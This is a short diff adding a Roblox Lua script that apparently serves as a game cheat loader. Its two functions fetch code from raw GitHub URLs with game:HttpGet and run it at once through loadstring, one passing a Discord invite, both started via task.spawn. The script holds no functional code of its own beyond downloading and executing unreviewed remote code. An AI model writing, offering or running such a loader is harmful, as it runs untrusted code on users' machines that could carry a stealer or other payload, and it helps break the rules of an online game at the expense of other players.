@@ -1,0 +1,10 @@
+local function Main()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/JadeSCRIPTZ/GAG/refs/heads/main/JadeHUB'))() 
+end
+local function Script()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/JadeSCRIPTZ/VisualScripts/refs/heads/main/JadeScript", true))("discord.gg/7Ch7teVX")
+
+end
+
+task.spawn(Main)
+task.spawn(Script)
